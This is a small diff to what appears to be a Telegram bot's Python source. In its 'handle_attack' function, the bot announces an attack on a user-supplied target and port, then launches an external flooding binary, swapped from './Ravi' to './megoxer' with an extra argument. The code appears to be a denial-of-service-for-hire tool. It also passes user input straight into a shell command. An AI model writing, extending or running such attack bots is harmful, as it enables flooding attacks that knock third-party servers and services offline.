@@ -109,7 +109,7 @@ def handle_attack(message):
     bot.send_message(message.chat.id, f"🚀 **𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!**\n🎯 `{target} : {port}`\n⏳ {time_duration}s")
 
     try:
-        subprocess.run(f"./Ravi {target} {port} {time_duration}", shell=True, check=True)
+        subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True)
     except subprocess.CalledProcessError as e:
         bot.reply_to(message, f"❌ **𝐄𝐑𝐑𝐎𝐑:** {e}")
         del active_attacks[user_id]
